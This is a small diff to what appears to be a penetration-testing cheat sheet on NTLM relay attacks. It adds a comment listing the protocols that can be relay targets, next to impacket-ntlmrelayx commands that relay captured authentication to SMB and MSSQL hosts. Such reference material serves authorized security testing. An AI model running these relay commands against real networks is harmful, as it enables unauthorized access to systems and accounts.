@@ -2133,6 +2133,7 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
 
     # You might need to select a target with "-t"
+    # smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://
     impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
     impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support
 
